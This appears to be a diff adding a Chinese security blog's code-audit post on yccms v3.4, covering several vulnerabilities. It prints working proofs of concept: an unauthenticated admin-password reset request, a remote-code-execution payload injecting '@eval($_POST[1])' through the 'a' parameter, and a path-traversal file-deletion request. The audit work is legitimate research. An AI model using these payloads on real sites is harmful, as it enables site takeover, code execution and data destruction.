@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        yccms_v3.4审计 | 东隅's blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/jocker.png"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
+            
+              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
+            
+              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">yccms_v3.4审计</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag">#代码审计</a>
+  
+
+
+          <span class="post-date">2023-06-09</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body--toc">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BF%AE%E6%94%B9admin%E5%AF%86%E7%A0%81"><span class="toc-text">未授权修改admin密码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#rce"><span class="toc-text">rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A41"><span class="toc-text">任意文件删除1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A42"><span class="toc-text">任意文件删除2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01"><span class="toc-text">任意文件上传1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02"><span class="toc-text">任意文件上传2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E5%A4%8D%E7%94%A8"><span class="toc-text">验证码复用</span></a></li></ol>
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <p>[TOC]</p>
+<p>第一步仍然是搭好网站，这个网站还是很好搭的</p>
+<p>后台 /admin</p>
+<p>这个cms也是mvc架构</p>
+<p>controller文件夹存放控制器文件,view文件夹存放视图文件,model文件夹存放数据文件</p>
+<h1 id="未授权修改admin密码"><a href="#未授权修改admin密码" class="headerlink" title="未授权修改admin密码"></a>未授权修改admin密码</h1><p>漏洞点在这里</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306071204077.webp" alt="image-20230607120441111"></p>
+<p>主要就是这里</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;_model-&gt;username=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;_model-&gt;password=sha1(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$_edit</span>=<span class="keyword">$this</span>-&gt;_model-&gt;editAdmin();</span><br></pre></td></tr></table></figure>
+
+<p>该函数位于model\AdminModel.class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editAdmin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$_sql</span>=<span class="string">&quot;UPDATE</span></span><br><span class="line"><span class="string">                    my_admin</span></span><br><span class="line"><span class="string">                SET</span></span><br><span class="line"><span class="string">                    username=&#x27;<span class="subst">$this</span>-&gt;username&#x27;,</span></span><br><span class="line"><span class="string">                    password=&#x27;<span class="subst">$this</span>-&gt;password&#x27;</span></span><br><span class="line"><span class="string">                WHERE</span></span><br><span class="line"><span class="string">                    id=1</span></span><br><span class="line"><span class="string">                LIMIT 1&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="variable">$_sql</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>他所在的类继承了这个类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminModel</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br></pre></td></tr></table></figure>
+
+<p>跟进去看一下</p>
+<p>位于model\Model.class.php，看一下update函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$_sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute(<span class="variable">$_sql</span>)-&gt;rowCount();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用execute函数去执行sql语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$_sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			<span class="variable">$_stmt</span>=<span class="keyword">$this</span>-&gt;_db-&gt;prepare(<span class="variable">$_sql</span>);</span><br><span class="line">			<span class="variable">$_stmt</span>-&gt;execute();</span><br><span class="line">		&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>)&#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">&#x27;SQL语句:&#x27;</span>.<span class="variable">$_sql</span>.<span class="string">&#x27;&lt;br /&gt;错误信息:&#x27;</span>.<span class="variable">$e</span>-&gt;getMessage());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$_stmt</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>editAdmin函数直接把传进来的username password拼接到sql语句中，然后去更新相关表中id=1的数据，这也就造成了任意更改管理员账号密码</p>
+<p>直接进行了信息更新，这一系列操作并没有对用户身份进行验证</p>
+<p>poc</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/?a=admin&amp;m=update</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="llvm">username<span class="operator">=</span>admin&amp;password<span class="operator">=</span><span class="number">123456</span>&amp;notpassword<span class="operator">=</span><span class="number">123456</span>&amp;send<span class="operator">=</span><span class="variable">%E4</span><span class="variable">%BF</span><span class="variable">%AE</span><span class="variable">%E6</span><span class="variable">%94</span><span class="variable">%B9</span><span class="variable">%E5</span><span class="variable">%AF</span><span class="variable">%86</span><span class="variable">%E7</span><span class="variable">%A0</span><span class="variable">%81</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h1><p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/admin/?a=Factory();phpinfo();//../</span><br><span class="line">/admin/?a=Factory();@eval($_POST[1]);//../</span><br></pre></td></tr></table></figure>
+
+<p>让我来看看为什么</p>
+<p>漏洞点在这个地方，他把这个$a没进行处理就拼接进去了，导致可以用;分隔开执行后面我想执行的代码，最后用//注释就好了</p>
+<p>需要绕一下的就是这一句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!file_exists(ROOT_PATH.<span class="string">&#x27;/controller/&#x27;</span>.ucfirst(<span class="variable">$_a</span>).<span class="string">&#x27;Action.class.php&#x27;</span>)) <span class="variable">$_a</span> = <span class="string">&#x27;Login&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!file_exists(ROOT_PATH.<span class="string">&#x27;/controller/&#x27;</span>.Factory();phpinfo();<span class="comment">//../.&#x27;Action.class.php&#x27;)) $_a = &#x27;Login&#x27;;</span></span><br><span class="line">Factory();phpinfo();<span class="comment">//../</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过file_exists（）函数的验证，这个函数在进行检查会有一个bug，比如/controller/admin;/../，函数允许路径中有一些特殊字符，并且遇到/../会返回到上级目录，可以利用这个策略逃逸出 file_exists（）函数检查。<br>构造payload—&gt;Factory();phpinfo();//../<br>Factory()是为了闭合eval中的new实例化，然后后面的是执行的命令语句，所以我们要找有生成Factory（）实例的文件/config/run.inc.php</p>
+<p>ucfirst — 将字符串的首字母转换为大写，起不到啥作用</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306081343731.webp" alt="image-20230608134304743"></p>
+<p>调用流程如下</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306081347646.webp" alt="image-20230608134734332"></p>
+<blockquote>
+<p>ps:autoload机制</p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000006188247">https://segmentfault.com/a/1190000006188247</a></p>
+</blockquote>
+<h1 id="任意文件删除1"><a href="#任意文件删除1" class="headerlink" title="任意文件删除1"></a>任意文件删除1</h1><p>漏洞点位于后台，未对用户身份进行校验，可未授权删除。</p>
+<p>poc</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/admin?a=pic&amp;m=delall</span><br><span class="line"></span><br><span class="line">pid[0]=../test.txt&amp;send=删除选中图片</span><br></pre></td></tr></table></figure>
+
+<p>test.txt位于根目录位置</p>
+<p>调用顺序如下，可以看到这里可以目录穿越，可以从原本设计的upload文件夹穿越出来</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306082258330.webp" alt="image-20230608225804950"></p>
+<h1 id="任意文件删除2"><a href="#任意文件删除2" class="headerlink" title="任意文件删除2"></a>任意文件删除2</h1><p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306090032307.webp" alt="image-20230609003240925"></p>
+<p>第二处文件删除在controller/ArticleAction.class.php，查看代码如下，以get方法接收id参数，先连接数据库查找该id是否存在，若存在则删除该id所对应的文章，因此这里无法删除任意文件，只能删除文章</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306090040671.webp" alt="image-20230609004035180"></p>
+<h1 id="任意文件上传1"><a href="#任意文件上传1" class="headerlink" title="任意文件上传1"></a>任意文件上传1</h1><h1 id="任意文件上传2"><a href="#任意文件上传2" class="headerlink" title="任意文件上传2"></a>任意文件上传2</h1><h1 id="验证码复用"><a href="#验证码复用" class="headerlink" title="验证码复用"></a>验证码复用</h1>
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/06/15/http%E8%B5%B0%E7%A7%81%E7%AC%94%E8%AE%B0/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>http走私笔记</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/06/08/%E9%9B%B6%E5%AE%BD%E9%9A%90%E5%86%99/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      零宽隐写
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
+                    <a class="foot-link" href="">735587142</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    
+    
+  
+  
+    <script type="text/javascript" src=/js/toc.js></script>
+  
+
+  </body>
+</html>
